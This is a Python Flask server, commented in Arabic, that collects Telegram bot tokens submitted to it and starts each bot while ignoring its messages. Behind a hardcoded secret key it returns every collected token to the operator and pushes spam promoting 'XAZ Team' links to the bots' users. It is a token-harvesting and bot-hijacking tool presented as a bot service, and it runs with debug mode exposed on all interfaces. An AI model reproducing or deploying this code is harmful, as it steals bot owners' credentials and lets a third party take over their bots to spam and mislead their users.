from flask import Flask, request, jsonify
import telebot
import threading
import requests

app = Flask(__name__)

# تخزين البوتات
bots = {}

# مفتاح سري لاستعادة التوكنات
SECRET_KEY = "xazow9wowgowwy29wi282r30wyw0wuoewgwowfepwpwy19192828827297282738383eueo"

# دالة للتحقق من صحة التوكن
def is_valid_token(token):
    try:
        url = f"https://api.telegram.org/bot{token}/getMe"
        response = requests.get(url)
        return response.status_code == 200 and response.json().get("ok", False)
    except Exception as e:
        print(f"Error validating token: {e}")
        return False

# دالة لبدء تشغيل البوت
def start_bot(token):
    bot_instance = telebot.TeleBot(token)

    @bot_instance.message_handler(func=lambda message: True)
    def handle_message(message):
        pass  # تجاهل الرسائل

    thread = threading.Thread(target=bot_instance.polling, kwargs={"none_stop": True, "skip_pending": True})
    thread.daemon = True  # التأكد من إغلاقه عند إنهاء التطبيق
    thread.start()

    bots[token] = {"instance": bot_instance, "thread": thread}

# API لإضافة توكن
@app.route('/add_bot', methods=['POST'])
def add_bot():
    data = request.json
    token = data.get('token')

    if not token:
        return jsonify({'error': 'Token is required'}), 400

    if not is_valid_token(token):
        return jsonify({'error': 'Invalid token'}), 400

    if token in bots:
        return jsonify({'message': 'Bot already running'}), 200

    start_bot(token)
    return jsonify({'message': 'Bot added successfully', 'token': token})

# API لاستعادة جميع التوكنات باستخدام مفتاح سري
@app.route('/get_tokens', methods=['GET'])
def get_tokens():
    if request.args.get('key') != SECRET_KEY:
        return jsonify({'error': 'Unauthorized'}), 401
    return jsonify({'tokens': list(bots.keys())})

# API لإرسال رسالة لجميع البوتات
@app.route('/send_message', methods=['POST'])
def send_message():
    if request.json.get('key') != SECRET_KEY:
        return jsonify({'error': 'Unauthorized'}), 401

    message_text = (
        "**تم إرسال طلب للسيرفر، قريبًا سيتم إضافة هذا البوت لسيرفر XAZ، يُرجى الانتظار 🤖**\n\n"
        "**🔹 XAZ Team Official Links 🔹**\n"
        "🌍 **Source Group:** [XAZ Team Source](https://t.me/xazteam)\n"
        "🌍 **New Team Group:** [Join XAZ Team](https://t.me/+nuACUoH_xn05NjE0)\n"
        "🌍 **XAZ Team Official Website:** [Visit Website](https://xaz-team-website.free.bg/)\n\n"
        "**🌍 XAZ Team Official Website 🌍**\n"
        "⚠ **Note:** If the page doesn't load completely, try enabling PC Mode for the best experience.\n"
        "Stay safe and always verify official sources! 💙"
    )

    success_count = 0

    for token, data in bots.items():
        bot_instance = data["instance"]
        try:
            updates = bot_instance.get_updates()
            for update in updates:
                if update.message:
                    bot_instance.send_message(update.message.chat.id, message_text, parse_mode="Markdown")
                    success_count += 1
        except Exception as e:
            print(f"Error sending message with bot {token}: {e}")

    return jsonify({'message': f'Message sent successfully to {success_count} chats'})

# API لإيقاف جميع البوتات
@app.route('/stop_bots', methods=['POST'])
def stop_bots():
    if request.json.get('key') != SECRET_KEY:
        return jsonify({'error': 'Unauthorized'}), 401

    for token, data in bots.items():
        bot_instance = data["instance"]
        bot_instance.stop_polling()

    bots.clear()
    return jsonify({'message': 'All bots stopped successfully'})

# تشغيل سيرفر Flask
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
